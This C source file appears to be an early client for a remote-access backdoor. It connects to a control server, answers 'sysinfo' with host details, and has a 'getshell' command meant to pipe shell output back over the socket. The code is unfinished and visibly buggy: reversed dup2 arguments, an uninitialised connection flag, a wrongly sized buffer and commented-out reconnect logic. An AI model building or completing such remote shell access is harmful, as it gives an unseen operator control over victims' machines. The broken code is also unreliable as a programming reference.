#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include "prompt.h"
#include "network.h"

int main() // Program's entry point.
{
	int socket_fd, is_connected;
	char *recv_data = malloc(256 * sizeof(recv_data)); // Should be changed, fixed size can cause security issues (BOF).

	socket_fd = server_connect();

	if (socket_fd != -1) { // Check if server_connect() succeeded.
		printf("[V] Connected to server!\n"); // For debugging.
		is_connected = 1;
	} 

	while (is_connected) {
		if (receive_data(socket_fd, recv_data) != 0) { // Recveive data from socket.
			printf("Command: %s\n", recv_data); // For debugging.

			if (strcmp(recv_data, "sysinfo") == 0) {

				send_data(socket_fd, get_system_info());

			} else if (strcmp(recv_data, "getshell") == 0) { 
				
				int r;
				int result = dup2(1, socket_fd);
				r = system("ls -l"); // Will print results to the terminal, we want it to print the results to the socket.

			}
			
		}
		memset(recv_data, '\0', 256);	


		// This part is still very buggy.
		//if (check_connection(socket_fd) == -1) {
		//	printf("Lost connection.\n");
		//	reconnect();
		//	printf("[V] Reconnected");
		//}
		
	}

	return 0;
}	
